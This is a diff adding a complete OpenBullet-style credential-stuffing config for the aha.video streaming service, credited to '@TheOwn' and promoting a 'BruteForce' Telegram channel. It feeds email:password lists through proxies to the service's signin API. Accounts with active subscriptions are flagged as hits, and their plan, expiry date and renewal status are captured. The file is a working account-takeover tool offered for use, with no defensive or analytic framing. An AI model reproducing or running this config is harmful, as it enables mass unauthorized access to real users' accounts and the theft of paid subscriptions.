@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "aha.video",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-14T00:48:42.0797679+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | Move Free To Custom | ",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST POST "https://prod-api.viewlift.com/identity/signin?site=aha-tv" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.aha.video" 
+  HEADER "referer: https://www.aha.video/user/account" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "EMAIL_NOT_REGISTERED" 
+    KEY "EMAIL_OR_PASSWORD_INCORRECT" 
+  KEYCHAIN Success OR 
+    KEY "\"isSubscribed\":true" 
+    KEY "\"DEVICE_LIMIT_EXCEEDED\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"isSubscribed\":false" 
+
+#Token PARSE "<SOURCE>" LR "{\"authorizationToken\":\"" "\",\"" -> VAR "Token" 
+
+REQUEST GET "https://prod-api.viewlift.com/identity/user?site=aha-tv" 
+  
+  HEADER "origin: https://www.aha.video" 
+  HEADER "referer: https://www.aha.video/user/account" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: <Token>" 
+
+#Plan PARSE "<SOURCE>" LR "\"identifier\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Expiry_Date PARSE "<SOURCE>" LR "subscriptionEndDate\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry Date" 
+
+#Auto_ReNewAble PARSE "<SOURCE>" LR "\"renewable\":" ",\"" CreateEmpty=FALSE -> CAP "Auto ReNewAble" 
+
+#CC FUNCTION Constant " T.me/BruteForce " -> CAP "Telegram Channel:" 
+
